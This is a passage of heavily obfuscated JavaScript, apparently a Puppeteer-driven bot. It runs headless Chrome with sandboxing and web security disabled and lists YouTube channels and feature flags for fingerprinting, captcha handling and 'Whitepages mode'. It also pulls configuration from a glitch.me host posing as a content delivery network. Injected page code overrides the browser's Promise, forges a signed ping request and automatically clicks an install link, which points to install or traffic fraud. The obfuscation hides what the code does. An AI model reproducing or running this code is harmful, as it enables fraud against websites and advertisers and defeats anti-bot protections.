                return this['bytes'] > -0x193bbd5f3 * 0x1 + 0x476374b1 * 0x7 + 0xa003a51b && (this['hBytes'] += this['bytes'] / (-0x96382288 + -0x1 * 0x9d74a42c + 0x1df34a * 0x12d2) << 0x9fd * 0x3 + 0x2b * 0x53 + -0x2be8, this['bytes'] = this['bytes'] % (-0x10e260ffc + 0x5c02f23c + 0x2113be * 0xd20)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x11c7 + -0x80 * 0x3a + 0x2ec8;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1d03 + -0x899 + 0x4 * 0x96b] = this['block'], J[K >> 0x9 * 0x96 + 0xea5 * 0x2 + -0x1147 * 0x2] |= x[-0x1 * 0x171d + 0x31d * 0x6 + -0x239 * -0x2 & K], this['block'] = J[0x74 * 0x10 + -0xfca + 0x89a], K >= 0x2704 + 0x1 * 0x4c1 + 0x1 * -0x2b8d && (this['hashed'] || this['hash'](), J[0x5db + -0x2 * 0x35e + 0x2d * 0x5] = this['block'], J[-0x22 * -0x6b + 0xa7 * 0x17 + -0x1d27] = J[-0x13f6 + 0x2fc * 0x8 + -0x3e9] = J[0x953 + 0x18e4 + -0x2235] = J[-0x55 + -0x3 * -0x87b + -0x1919] = J[-0x1d5c + 0x1 * 0xb53 + 0x120d] = J[-0x1 * 0x12bf + -0xe55 + 0xe5 * 0x25] = J[0x305 * 0xb + 0x1 * 0x1a85 + -0x3bb6] = J[-0x2 * 0xcfb + -0x341 + -0x2 * -0xe9f] = J[0xcbd + 0xd0b + -0x19c0] = J[-0x2 * 0xc62 + -0x8 * 0x22c + -0x2a2d * -0x1] = J[-0x1 * -0xb5a + -0x3 * 0xcd + -0x1 * 0x8e9] = J[0x3a * -0x86 + -0x1ea8 + -0x58d * -0xb] = J[0x61b * 0x4 + -0x3 * -0x41f + 0x13 * -0x1ef] = J[0x83b * -0x3 + -0xfae + -0xa1b * -0x4] = J[-0x6f2 + -0x700 + 0xe00] = J[0x15f9 + 0x6c9 + -0xed * 0x1f] = 0x1b6e + 0x355 * 0xb + -0x5 * 0xcd1), J[0x2178 + 0xc3a + -0x2da4] = this['hBytes'] << 0x2 * 0x7d3 + -0x1 * 0x25ee + 0x164b | this['bytes'] >>> -0x2f * -0xb7 + -0x1201 + 0xf7b * -0x1, J[-0x11c9 + 0x2 * -0x122 + 0xea * 0x16] = this['bytes'] << -0x1685 + 0x119b * 0x1 + -0x4ed * -0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xad3 * 0x1 + -0x127d + -0x17 * -0x56; J < 0x20dc + -0x1956 + -0x736; ++J)
                K = Q[J - (-0x1d87 * 0x1 + 0x15af + 0x1 * 0x7db)] ^ Q[J - (-0x5b8 + -0x21f6 + 0x27b6)] ^ Q[J - (0x1947 + 0x21da + -0x3b13)] ^ Q[J - (0x1dfe * 0x1 + -0xeab * 0x1 + -0xf43)], Q[J] = K << 0x211b + 0x149f + -0x35b9 * 0x1 | K >>> -0x6e * 0x46 + -0x8af * 0x2 + 0x2f91;
              for (J = 0x39c + 0xea4 + -0x4 * 0x490; J < -0x2103 + -0x51 * -0x57 + 0x590; J += -0xa6b * -0x1 + 0x1f1c + 0x1 * -0x2982)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x245 + -0x85f + 0xaa9 | L >>> 0x1d0 * 0x5 + 0xa66 + -0x135b) + (M & N | ~M & O) + P + (-0x11ddf3 * 0x5ce + 0x103 * -0x5cf415 + 0x12043c362) + Q[J] << 0xb * -0x2a1 + 0x70f * 0x5 + 0x11 * -0x60) << 0x92 * 0x3b + -0x256c + 0x1 * 0x3cb | P >>> 0x47b * 0x5 + -0x19dc * -0x1 + -0x43 * 0xb8) + (L & (M = M << 0x135d + 0xae1 + -0x1e20 | M >>> -0x10f * 0xb + -0x13a6 + 0x3 * 0xa6f) | ~L & N) + O + (-0x1cc3 * 0x6226b + 0xb4d1a407 + -0x6d0d1 * -0xca3) + Q[J + (-0x18e0 + 0x191 * 0x9 + -0x78 * -0x17)] << 0x1d1e + -0x2 * -0xab5 + -0x3288) << 0xedb + -0x4 * -0x577 + -0x24b2 | O >>> 0x4 * -0x538 + -0x1f53 + 0x344e) + (P & (L = L << -0xc89 * -0x1 + -0x19 * -0x106 + -0x2601 | L >>> -0x2042 + 0x83b + 0x1809) | ~P & M) + N + (-0x1 * 0x7baa4e43 + 0x2977da7d + 0xacb4ed5f) + Q[J + (-0x16 * -0xe2 + 0x2360 + 0x1b65 * -0x2)] << -0x2 * -0x102a + -0x193 * -0x6 + -0x29c6) << 0x1bf1 + 0xaf4 + -0x26e0 | N >>> -0xf5e + 0x1c9e + 0x5 * -0x2a1) + (O & (P = P << 0x7f9 + 0x1baf + -0x238a | P >>> 0x105 + -0x37f * -0x1 + -0x482 * 0x1) | ~O & L) + M + (-0xa091572 + -0x44c1c465 + 0xa94d5370) + Q[J + (0x1247 * -0x2 + -0x1 * 0x1a3e + 0x3ecf)] << -0x7 * -0x99 + -0x128d + 0xe5e) << 0x25fb + 0x323 + 0x15 * -0x1f5 | M >>> 0x3 * -0x61f + -0x5 * -0x10d + -0xc7 * -0x11) + (N & (O = O << 0x3d * 0x9d + 0x1c76 + -0x41c1 | O >>> 0x97 * -0x17 + -0x1715 + -0x66 * -0x5c) | ~N & P) + L + (0x14487215 * 0x5 + 0xa14e4442 + -0xac360512) + Q[J + (0x1edc + -0x8 * -0x286 + -0x3308)] << 0x1bdb + -0x8ac + 0x1 * -0x132f, N = N << -0xd * -0x12 + 0x225a + -0x2326 | N >>> -0x5 * 0x308 + -0x3b * 0x3e + 0x1d74;
              for (; J < -0x2 * -0x115 + -0x1 * -0x242a + -0x262c; J += -0x22b9 + 0x1395 + 0xf29)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1e3 * -0xd + -0x2f1 * 0x6 + -0x1b7 * 0x4 | L >>> -0xce * -0x2 + -0x2178 + -0xa7 * -0x31) + (M ^ N ^ O) + P + (0x487d864d + 0xcfd97a3 * -0x3 + -0x5cf1c9 * -0xd5) + Q[J] << -0x1400 + 0x1923 + 0x523 * -0x1) << -0xe61 + 0x20ce + -0x1268 * 0x1 | P >>> 0x11dc + -0xb * 0x1b0 + -0x17 * -0x9) + (L ^ (M = M << 0x2624 + -0x1dab + 0x3 * -0x2c9 | M >>> -0x3ae + -0xb3c + 0xeec) ^ N) + O + (0x22f4dc * 0x1d7 + 0x9103eabe + -0x3f80a5 * 0x18d) + Q[J + (-0x25ab * -0x1 + 0x19 * 0x33 + -0x9 * 0x4bd)] << 0xe5a + -0xe09 + 0x51 * -0x1) << -0x1448 + 0xf67 + -0x16 * -0x39 | O >>> -0x209c + -0x2b7 + 0x2 * 0x11b7) + (P ^ (L = L << 0xa * -0x175 + 0x2393 + -0x14e3 | L >>> 0x2486 + -0x2c4 + -0x10e0 * 0x2) ^ M) + N + (-0xbda991e0 + 0x50dd * 0x48a6 + 0x11590e633) + Q[J + (0x1dc9 + 0x6df + -0x24a6)] << 0x2 * 0x1d9 + 0x1f39 + 0x1 * -0x22eb) << 0x15da * -0x1 + -0x2ec * -0x9 + -0x46d | N >>> 0x1543 + 0x1ee4 + 0x4 * -0xd03) + (O ^ (P = P << -0xde2 + -0x1c32 + 0x2a32 * 0x1 | P >>> -0x1d7f + -0x16d + -0x25 * -0xd6) ^ L) + M + (0x34 * 0x263d9e1 + -0x6b7 * 0x183983 + -0x2e4a * -0x33955) + Q[J + (0x18db + 0x7 * 0x479 + -0x3827)] << -0x1 * 0x216f + 0x1 * 0x12ff + 0xa8 * 0x16) << 0x7df * -0x2 + 0x1 * 0xc0c + 0x3b7 | M >>> 0x1261 + 0xfe6 + 0x12 * -0x1e6) + (N ^ (O = O << 0xe14 + -0x261a + 0x135 * 0x14 | O >>> -0x16d2 + 0x7 * 0x469 + 0x1d * -0x47) ^ P) + L + (0x16 * -0x37e4ab1 + 0x14af4c51 + 0xa7050a86 * 0x1) + Q[J + (-0x189d + 0x4b3 * -0x5 + 0x3020)] << -0x831 + -0x23 * 0x11c + -0x1 * -0x2f05, N = N << 0x1ef7 * 0x1 + -0x2605 + 0x11 * 0x6c | N >>> 0x1 * -0x253c + -0x1c67 + 0x41a5;
              for (; J < -0x6e5 * 0x1 + 0x9b * 0x11 + 0x87 * -0x6; J += 0xd63 * 0x1 + 0x1 * -0x313 + -0xa4b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x923 + -0x1 * -0xf98 + 0x670 * -0x1 | L >>> 0x1623 + -0x5 * 0x389 + 0x45b * -0x1) + (M & N | M & O | N & O) + P - (-0x57674944 + -0x2cba0 * 0x1546 + 0x103c35a28) + Q[J] << 0x24 * -0x98 + 0x2357 + 0x19 * -0x8f) << -0x1 * -0x3d8 + 0x24bc * -0x1 + 0x19 * 0x151 | P >>> -0x1 * -0x1334 + 0x572 + 0x3d * -0x67) + (L & (M = M << 0x1dfd + -0x1 * -0xbd9 + -0x1e * 0x164 | M >>> 0xb8 * -0x26 + -0x2193 * -0x1 + -0x1 * 0x641) | L & N | M & N) + O - (0x2bf1 * -0x4aa27 + -0x66749b6f + -0x1697 * -0x129b46) + Q[J + (0x19 * -0xd2 + 0x903 + 0xb80)] << 0x826 * 0x3 + -0x1691 + -0x1e1) << -0x58e + -0xd88 + 0x49 * 0x43 | O >>> 0x1 * 0x14cb + -0x1 * 0x7b5 + -0xcfb) + (P & (L = L << 0x1634 + 0x2594 + -0x3baa | L >>> 0x1 * 0x707 + -0x19d7 + 0x12d2) | P & M | L & M) + N - (-0xac * 0x1384795 + -0x97a3e1aa + 0xed2c1e75 * 0x2) + Q[J + (-0x811 * -0x1 + 0x23eb + -0x2bfa)] << 0x280 + 0xeea * -0x1 + -0xe * -0xe3) << 0x233d + -0x21c3 + -0x175 | N >>> -0x1ca7 + 0x1 * -0x527 + -0x21e9 * -0x1) + (O & (P = P << -0x6fe + -0x63 * -0x1 + 0x6b9 | P >>> 0x2 * 0x12c1 + 0xc * -0x228 + -0xba0) | O & L | P & L) + M - (-0x15ec9130 * 0x4 + 0x226f6a86 + 0xa6271d5e) + Q[J + (0x107 * 0xa + -0x15a7 + 0x9 * 0x144)] << 0xf64 + 0x2b * 0xe3 + -0x3585) << -0x20e8 + -0x1 * -0x266a + -0x57d * 0x1 | M >>> 0x3e * 0x79 + 0x1c2a + 0x59 * -0xa5) + (N & (O = O << -0x339 + -0x17b0 + -0x197 * -0x11 | O >>> -0x215b + 0x10ba + 0x10a3) | N & P | O & P) + L - (-0x75de0d * 0x1af + -0x1e * 0x3ed373a + 0x426e9 * 0x675b) + Q[J + (-0x79 * 0xa + -0x21de + 0x269c)] << 0x59 + 0x13b9 + -0x1412, N = N << 0x2 * 0xe2a + 0x1201 * -0x1 + -0x367 * 0x3 | N >>> 0xf07 + -0x1024 * 0x1 + 0x29 * 0x7;
              for (; J < 0x27 * 0xad + -0x21c7 + -0x7bc * -0x1; J += -0x15b5 + -0x3b * 0x49 + 0x8b * 0x47)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x12e9 + -0xac + -0x1238 | L >>> -0x19c * -0x17 + -0x7 * -0x21 + -0x12e8 * 0x2) + (M ^ N ^ O) + P - (0x20692f * -0x1a4 + 0xbbf24c7 * 0x5 + -0x3d3f * -0xc8dd) + Q[J] << -0x7bc + -0xe22 + 0x15de) << 0x1c0d + -0x170b + -0x1 * 0x4fd | P >>> -0x1ef8 + -0x10bf * 0x1 + -0x1 * -0x2fd2) + (L ^ (M = M << -0x2 * 0x51b + -0x17c + 0x1 * 0xbd0 | M >>> 0x1 * 0x7e2 + 0x1273 + 0x17 * -0x125) ^ N) + O - (-0x513e * -0x8cff + 0x2269fec5 * -0x1 + 0x2b48682d) + Q[J + (0xd79 * 0x1 + 0x2 * -0xe46 + 0xf14)] << -0xe9c + -0x204f + 0x2eeb) << -0x21e3 + 0x1a6a + -0xe * -0x89 | O >>> -0x8a6 * 0x2 + -0x22bf + 0x3426) + (P ^ (L = L << 0x1a61 + 0x6f * 0x28 + -0x2b9b | L >>> 0x212 + 0x1b0e * 0x1 + -0x1d1e) ^ M) + N - (-0x242dd1d5 + -0xd * 0x48a5be6 + -0x1 * -0x94d1baad) + Q[J + (0xc7 + 0x236 * 0xe + -0x1fb9)] << 0x1 * -0x5b4 + 0x1e71 + -0x3 * 0x83f) << -0x23d * 0xb + -0x1b6a + -0x1 * -0x340e | N >>> 0x13 * 0xa6 + -0x3 * -0x7d + -0xce * 0x11) + (O ^ (P = P << 0x20 * 0x89 + -0x2029 + 0xf27 | P >>> 0x10a9 + -0x2 * -0x281 + -0x15a9 * 0x1) ^ L) + M - (-0x2 * -0x15bbfcd3 + -0x1 * -0x51556f24 + -0x47302aa0) + Q[J + (-0x1 * -0x14cb + 0x11 * 0x9 + -0x1561)] << -0x298 * 0xc + -0x3 * -0x97c + 0x9 * 0x4c) << 0x1470 + 0x80f + -0x5b2 * 0x5 | M >>> -0x65b * -0x3 + -0x1 * 0x1565 + 0x26f) + (N ^ (O = O << -0x938 + 0x1652 + -0xcfc | O >>> 0x668 + 0x2b * -0x8b + 0x10f3) ^ P) + L - (-0x3e66fe3a + 0x46628857 + 0x2da1b40d * 0x1) + Q[J + (0x1f66 + -0xf20 + -0x1042)] << 0x7f0 + 0x1618 + -0x3e * 0x7c, N = N << 0xddd + -0x2033 * 0x1 + 0x1274 * 0x1 | N >>> 0x104 * -0x7 + 0x16ed * -0x1 + -0x1 * -0x1e0b;
              this['h0'] = this['h0'] + L << 0xf91 + -0x2 * -0x409 + -0x3 * 0x7e1, this['h1'] = this['h1'] + M << 0x5 * -0x691 + 0x18ae + -0x1 * -0x827, this['h2'] = this['h2'] + N << 0x21bb + -0x1eed + -0x2ce * 0x1, this['h3'] = this['h3'] + O << 0x20cf + 0xc4a * 0x1 + -0x905 * 0x5, this['h4'] = this['h4'] + P << -0x1 * 0x22f2 + 0x58a * 0x4 + -0xcca * -0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x23f3 + -0x1 * -0x240b + 0x4 & 0x749 + 0x1c91 + 0x4d * -0x77] + w[J >> 0x1 * -0x132d + 0x1a67 + -0x391 * 0x2 & -0x12a7 + -0xb * -0x1a6 + 0x94 * 0x1] + w[J >> 0x1a74 + -0x84e + -0x606 * 0x3 & -0xb65 + 0xdf4 + -0x280] + w[J >> -0x14ba + 0x2a1 + -0x1 * -0x1229 & -0x12ea + 0x1 * 0xc46 + 0x6b3] + w[J >> 0x1db2 + -0x1e61 * -0x1 + -0x3c07 & -0x1ca6 + -0x1e84 + -0x3b39 * -0x1] + w[J >> -0x11e2 + 0x127 * -0x10 + 0x245a & -0x23c8 + -0x1027 + 0x33fe] + w[J >> -0x161c + -0x3 * 0x59e + 0x26fa & 0x11c5 + -0x3cc + 0x1a * -0x89] + w[-0x27 * 0x51 + 0x52a * -0x6 + 0x73b * 0x6 & J] + w[K >> -0x11de + 0x1f1f + -0xd25 & -0x255 * -0xe + -0x225f + 0x1c8] + w[K >> 0x1943 + 0x2a * 0x2b + -0x2039 * 0x1 & -0x1840 * 0x1 + 0x449 * 0x9 + -0xe42] + w[K >> 0x2414 + -0x16 * 0x18b + -0x20e & 0x1422 + -0x741 + 0x2 * -0x669] + w[K >> 0x237d + 0x5ab + -0x2918 * 0x1 & 0x1845 + 0xf * 0x22b + -0x38bb] + w[K >> 0x1f91 + -0x1385 + 0x400 * -0x3 & -0x10a5 + -0x9fa * 0x2 + -0x45 * -0x88] + w[K >> 0x3 * 0x769 + 0x2308 + 0x5b * -0xa1 & 0x24c0 + 0x2334 + -0x47e5] + w[K >> 0x1 * 0xcbc + -0x410 + -0x8a8 & -0x1 * 0x41d + -0x5 * -0xb5 + 0xa3] + w[-0x1 * 0x837 + 0x4 * -0x496 + 0x2 * 0xd4f & K] + w[L >> -0x210 + -0x694 + 0x8c * 0x10 & -0x38b * -0x3 + 0x1b3 + -0xc45] + w[L >> 0x1 * 0x2a5 + 0xe * 0x1ff + 0x25 * -0xd3 & 0x750 + -0x1823 + 0x10e2] + w[L >> 0x10 * -0x2b + -0x187 + 0x7 * 0x9d & 0x1d6a + 0x1069 * -0x2 + 0x1 * 0x377] + w[L >> 0x1910 + -0x19cf + 0xcf & 0xbf * 0x13 + 0x603 + -0x1 * 0x1421] + w[L >> 0x1 * 0x9a9 + 0x29 * 0x3b + -0x1310 & 0x1942 + 0xd19 + -0x264c] + w[L >> -0x1 * -0x531 + -0x131e + 0x18d * 0x9 & -0x168e + 0x24ea + -0xe4d] + w[L >> -0xf43 + 0x2 * 0x28f + 0xa29 & -0x18b5 + 0x4 * 0x38a + 0xa9c] + w[-0xe87 * 0x1 + 0xda9 * -0x1 + -0x7 * -0x409 & L] + w[M >> 0xc * -0x26 + -0x17 * 0x33 + 0x679 & 0x1 * 0x1c13 + -0x7c + -0x1b88] + w[M >> -0x1c29 + -0x21bd + 0x3dfe & -0x1 * -0x647 + 0x22bb * 0x1 + 0x28f3 * -0x1] + w[M >> 0x18cd + 0x2 * 0x1025 + -0x3903 & -0x30e + -0x1c5a + 0x9 * 0x37f] + w[M >> -0x1 * -0xa1f + 0x7 * 0x319 + 0xfdf * -0x2 & 0x1145 + -0x1b53 + 0x1 * 0xa1d] + w[M >> 0x225f + 0x2b * -0xb5 + -0x3ec & -0x7f4 * -0x2 + -0x2aa + 0x1b * -0x7d] + w[M >> -0x2351 + 0x1f3e + 0x1 * 0x41b & -0xb40 + -0x1e88 + -0x1 * -0x29d7] + w[M >> 0x1e1a + 0x249c + -0x2 * 0x2159 & -0x3bc * 0x1 + -0xe60 + 0x122b] + w[-0x1 * -0xffb + 0x17 * -0x10d + 0x83f & M] + w[N >> 0x2054 + -0xb42 + -0x14f6 & -0x1e * 0x11a + 0x6bf + 0x1a5c] + w[N >> 0x3c3 * 0x9 + 0x24a7 + -0x1 * 0x466a & 0xd18 + 0x1a11 + 0x5 * -0x7d2] + w[N >> -0xb23 + -0x1 + -0x167 * -0x8 & 0x25e0 + 0x22a1 + -0x4872] + w[N >> 0x149 + 0x1e0c + -0x641 * 0x5 & 0xb2f * -0x3 + 0x2091 * -0x1 + -0x1 * -0x422d] + w[N >> -0x275 * 0x3 + 0x4 * 0x15 + 0x717 & 0x1f8e + 0x1 * -0x1fbf + 0x8 * 0x8] + w[N >> 0x5f5 + -0x5 * -0x2cd + 0x2 * -0x9f7 & 0x1a86 + -0x1543 + -0x534] + w[N >> 0x5a + -0x1 * 0x1733 + 0x16dd & 0x1277 * 0x2 + 0x1930 + 0x3e0f * -0x1] + w[-0x19f1 + 0x2 * 0x107b + 0x1b * -0x42 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x3b8 + -0x1ae0 + 0x1eb0 & -0x1 * 0x347 + 0x1 * 0x135d + -0x1 * 0xf17,
                J >> -0xa4 * -0x1e + 0xc85 + -0x1fad & 0xe * -0x18a + 0x1 * 0x317 + 0x1374,
                J >> -0x20b5 * -0x1 + 0xb * 0x2e7 + -0x409a & 0xd05 + 0xaac + -0x5 * 0x48a,
                0x2614 + -0x27 * 0xbf + -0x3fe * 0x2 & J,
                K >> 0x203b + -0x120a + -0xe19 & 0x5fe + 0x12ae + -0x17ad * 0x1,
                K >> 0x1359 * 0x2 + 0x1 * 0x6b2 + -0x2d54 & 0x1e1c + 0x4 * 0x6ab + -0x37c9,
                K >> -0x1cd9 + -0x716 * 0x5 + 0x404f * 0x1 & 0x4 * 0x727 + 0xb * 0x139 + 0x36c * -0xc,
                -0x14e7 * -0x1 + 0xb69 + 0x1 * -0x1f51 & K,
                L >> -0xc0e + -0x7 * -0x39 + 0xa97 & 0x71 * 0x3b + 0x2456 + 0x36 * -0x123,
                L >> 0x2368 + -0xd * 0x1f7 + -0x9cd & 0x18 * -0x41 + 0x7c2 + -0x39 * 0x3,
                L >> -0x201c + 0x1792 + 0x892 & 0x1 * 0x243b + -0x1b5e + -0x7de,
                -0x150c + 0x24f * 0x1 + 0x4 * 0x4ef & L,
                M >> -0xa * -0x231 + -0x13d * 0xa + -0x970 & -0x4 * -0x463 + 0x1 * -0xe71 + -0x21c,
                M >> -0x10dc * -0x1 + -0xa * 0x1df + 0x1ea & -0x123c + 0xd28 + 0x613,
                M >> -0x4f7 + -0x3c0 + 0x8bf * 0x1 & -0x8 * -0x2b6 + 0x4ff + -0x19b0,
                0x210a + 0x7ec + -0x27f7 & M,
                N >> 0x1c1 * -0x2 + -0x1 * -0x1a3f + -0x16a5 & 0x10eb + 0x26cf + -0x36bb,
                N >> 0x2 * 0x445 + 0xe11 + -0x1d * 0xc7 & 0x2 * 0x7ca + 0x2 * 0x836 + -0x1f01,
                N >> 0x1d4f + 0x1 * -0xa67 + 0x97 * -0x20 & -0x2266 + 0x5 * 0x3d0 + 0x1055,
                0x18b8 + -0xf06 + -0x8b3 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1743 + -0x37 * 0x11 + 0x271 * -0x8), (K = new DataView(J))['setUint32'](0x177d + -0x118d * -0x2 + 0x3a97 * -0x1, this['h0']), K['setUint32'](-0xb27 * -0x1 + 0xc2 * 0x11 + -0xb * 0x22f, this['h1']), K['setUint32'](0x3 * 0x7bb + 0x1bc8 + -0x10fb * 0x3, this['h2']), K['setUint32'](-0x22e9 * -0x1 + -0xc91 * -0x1 + -0x2f6e, this['h3']), K['setUint32'](-0x277 * 0x3 + -0x1 * 0x13d5 + 0x1 * 0x1b4a, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xd * 0x29 + -0x237e + 0x2169];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x70 + 0x1fc4 * -0x1 + 0x2034;
            J[-0xee2 + 0x1bc8 + -0x7f * 0x1a]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * -0x7fd + 0x1793 + -0x1 * 0x1f90] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * 0x160e + -0x115f + 0x2 * 0x13b7), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x44f * 0x8 + -0x9 * -0x1f9 + 0x2 * -0x1a1c;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          const U = d;
          I[U(0xd)]();
        }, 0xda1 * -0x2 + -0xf5 * 0x9 + -0x1 * -0x29bb), Promise['resolve'](0x921 + 0x1206 * 0x1 + -0x1b26);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x151a + -0x869 * -0x2 + -0x8 * -0x89; j < -0x1108 + 0x49 * -0x3 + -0xa * -0x1ca; j++)
    i();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1f1b + -0xf96 + 0x2eb1);
    let h = e[f];
    if (c['VMQgtQ'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x322 + -0x93 * -0xe + 0x596 * -0x2, r, s, t = 0x1f3 * 0xb + 0x1 * -0x208b + 0xb1a; s = m['charAt'](t++); ~s && (r = q % (0x1 * -0xe81 + -0x2 * 0x135b + 0x1 * 0x353b) ? r * (-0xf40 + -0x606 * -0x1 + 0x4bd * 0x2) + s : s, q++ % (0x1d * -0x6d + -0x211 * 0x8 + 0xd * 0x239)) ? o += String['fromCharCode'](-0x2023 + 0x23f6 + -0x2d4 & r >> (-(-0x2449 + -0xfb * 0x10 + 0x33fb) * q & -0x2102 + -0xac * 0x35 + 0x2e * 0x17e)) : 0x1fbb + 0x3 * -0x208 + 0x19a3 * -0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x25ff + -0x1729 + -0xed6, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x245a + -0x26 * 0xbe + 0x409e))['slice'](-(0x2677 + 0x371 + 0x1f * -0x15a));
        }
        return decodeURIComponent(p);
      };
      c['XOxCXy'] = i, b = arguments, c['VMQgtQ'] = !![];
    }
    const j = e[-0x12c9 + 0x150 + -0x7 * -0x27f],
      k = f + j,
      l = b[k];
    return !l ? (h = c['XOxCXy'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const NETWORK_PATIENCE = 0x9 * 0x5c2 + 0x17 * 0xcb + -0x1 * 0x26cf + (-0x1934 + -0xa6 * 0x4 + 0x2784) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * -0x2144 + -0x1b7 * 0x13 + 0x41dc) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + V(0x6, '5YeN') + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xbf * 0x2 + -0x19a1 + 0x1823; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
